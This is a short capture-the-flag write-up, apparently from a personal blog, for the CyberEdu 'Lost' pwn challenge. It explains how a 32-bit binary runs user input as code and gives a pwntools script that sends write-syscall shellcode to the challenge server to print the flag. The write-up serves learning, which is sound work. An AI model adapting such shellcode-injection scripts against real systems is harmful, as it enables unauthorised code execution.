+++
date = '2025-12-03'
draft = false
title = 'CyberEdu Lost Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn"]
+++

## Challenge overview

Oh no! I lost my flag somewhere in memory. Can you **[help me](https://app.cyber-edu.co/challenges/1cfe88c0-44a0-11ed-9561-9d3e2d8bb042?tenant=cyberedu)** find it, please? Make sure to do it quickly!

![challenge-screenshot](pic1.png#center)

Upon trying to run the binary, we are greeted by a `so` version mismatch, but I won't bother downloading it myself, so let's see if we can solve it remotely. We can see it is a 32-bit binary though.

![challenge-screenshot](pic2.png#center)

Taking a look at main, we can see the flag getting copied into a `dest` buffer. Our input is stored into `buf`.

First, we `mmap` (memory map, aka allocate memory in a mmap region for) the `buf`, and then call `munmap` (memory unmap, does the opposite) on it.  

Then, this line of code

`((void (__stdcall *)(int, int, void *))buf)(v4, v5, dest);`

executes the instructions inside `buf`. Since it already has `0, 0, flag` as parameters, I made a little shellcode that calls write to display the flag.

```python

from pwn import *
p=remote('34.159.14.234', 30452)

context.arch = 'i386'
p.recvuntil(b't')

shellcode = asm("""
    mov ecx, [esp+12]
    mov eax, 4
    mov ebx, 1
    mov edx, 100
    int 0x80
    xor ebx, ebx
    mov eax, 1
    int 0x80
""")

p.sendline(shellcode)

p.interactive()

```

You wouldn't guess what got printed. The *exact* string from the binary. I assumed it was a decoy, but yeah, that was the flag, didn't even have to go trough all this trouble!
